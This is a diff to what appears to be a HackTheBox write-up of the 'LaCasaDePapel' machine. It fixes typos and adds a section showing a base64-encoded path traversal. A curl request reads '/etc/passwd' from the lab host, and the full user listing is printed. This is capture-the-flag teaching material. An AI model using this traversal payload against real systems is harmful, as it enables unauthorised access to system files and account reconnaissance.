@@ -290,7 +290,7 @@ Now, to be able to use it in Firefox, we must change the format. A quick search 
 > *"Firefox primarily uses the PKCS#12 format (files with `.p12` or `.pfx` extensions)
 > for importing personal user certificates (with private keys)"*
 
-With OpenSSL, is pretty easy, we just need to read the [man](https://docs.openssl.org/1.1.1/man1/pkcs12/#notes)
+With OpenSSL is pretty easy, we just need to read the [man](https://docs.openssl.org/1.1.1/man1/pkcs12/#notes)
 
 > *Create a PKCS#12 file:
 > openssl pkcs12 -export -in file.pem -out file.p12 -name "My Certificate"*
@@ -349,7 +349,7 @@ Now, reloading the webpage, we should get a request for our valid certificate. C
   </a>
 </p>
 
-We are presented with a "`Private Area`", featuring two sections "Season 1" and "Season 2". Inside of them we have what looks like videos of the whole show. When clicking for the files, it doesn download an empty .avi file. However, when putting our cursor on top of the file we can see some pretty interesting things.
+We are presented with a "`Private Area`", featuring two sections "Season 1" and "Season 2". Inside of them we have what looks like videos of the whole show. When clicking for the files, it downloads an empty .avi file. However, when putting our cursor on top of the file we can see some pretty interesting things.
 
 <p align="center">
   <a href="/assets/images/lacasadepapel/Captura18.PNG" class="glightbox">
@@ -365,4 +365,58 @@ First, we have in the URL a variable named path, which always asked to be tested
   </a>
 </p>
 
+It is a base64 encoded string.
 
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
+└─$ echo 'U0VBU09OLTEvMDEuYXZp' | base64 -d
+SEASON-1/01.avi
+```
+My first test will be the path varibale. We can try accessing the previous directory.
+
+<p align="center">
+  <a href="/assets/images/lacasadepapel/Captura20.PNG" class="glightbox">
+    <img src="/assets/images/lacasadepapel/Captura20.PNG" width="700">
+  </a>
+</p>
+
+It looks like the home directory of someone. With this approach we can't access files directly but rather directories, so we'll try base64 encoding it and using the /files path where the webpage was accessing the .avi files. To make this more agile, I'll use curl from my terminal.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
+└─$ curl -k https://lacasadepapel.htb/file/$(echo -n "../../../../etc/passwd" | base64)
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
+dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
+berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
+professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
+vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin
+memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
+```
